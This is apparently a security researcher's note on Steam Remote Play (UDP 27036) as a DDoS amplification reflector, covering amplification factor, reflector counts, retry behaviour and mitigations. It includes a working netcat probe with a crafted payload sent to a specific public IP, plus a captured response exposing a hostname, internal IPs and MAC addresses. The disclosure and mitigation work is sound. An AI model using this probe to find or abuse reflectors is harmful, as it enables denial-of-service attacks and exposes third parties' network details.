# Steam In-Home Streaming (Steam Remote Play)

## Port: 27036

## Proto: UDP

## Amplification factor: ~17x

## Reflector count: ~347,000

### Update 20/02 - Patched from hackerone report, reflectors now at **790** ! (Scan from Aug 2020)

---

- Steam In-Home Streaming allows streaming and playing games from one PC to another or with friends (on the internet).
- The Request for info packet reveals hostname, internal IP's and MAC addresses which amplify the initial request.
- If no response to the reply within 5 seconds, this protocol will send the data again (some kind of UDP error retry mechanism).
  - **Same data is sent 3 times before giving up.**
    - Instantly, after 3s, then after 20s.
  - This is more interesting (and potentially dangerous) than singleton data overflowing into fragments because it is an entirely new packet.

### Example Request / Response

- Request: 17 bytes (1x)

  - > ~# echo -ne '\xff\xff\xff\xff\x21\x4c\x5f\xa0\x05\x00\x00\x00\x08\xd2\x09\x10\x00'|nc -u 90.127.28.132 27036 -w1|wc -c

- Response: 247 bytes (3x times)

  - ASCII: `` ����!L_����癒��~�ѣ�����L���"Phantom08@JpL����!X`����pz90-61-AE-B3-42-79z00-15-5D-44-80-A7z30-9C-23-48-BF-1Az90-61-AE-B3-42-78z00-E0-4C-01-0C-58z90-61-AE-B3-42-7C� 192.168.4.49� 192.168.1.10�90.127.28.132 ``
  - Raw Bytes: `ffffffff214c5fa01600000008fc89cee79992a7c67e100118f8d1a387e3dfdffa4cd100000008081006189cd30122075068616e746f6d3002381040014a0e09704ce8040100100110b4b5d121580160bddac8ef0570007a1139302d36312d41452d42332d34322d37397a1130302d31352d35442d34342d38302d41377a1133302d39432d32332d34382d42462d31417a1139302d36312d41452d42332d34322d37387a1130302d45302d34432d30312d30432d35387a1139302d36312d41452d42332d34322d3743a2010c3139322e3136382e342e3439a2010c3139322e3136382e312e3130aa010d39302e3132372e32382e313332`

### Documentation

- <https://support.steampowered.com/kb_article.php?ref=8571-GLVN-8711>
- <https://www.lifehacker.com.au/2014/05/how-to-setup-steam-in-home-streaming-and-fix-its-quirks/>
- [Disable Steam Remote Play on client](https://steamcommunity.com/groups/homestream/discussions/0/352792037330670002/)

### Mitigations

- Stop allowing default Internet access (yet again...), restrict to LAN as default configuration (Steam's issue).
- Response data ALWAYS consists of Steam's proprietary `\xff\xff\xff\xff` query prefix.
- Data size and data itself vary greatly depending on internal addresses and connected device MAC addresses, responses can range from 50 bytes to 400 in a single packet.
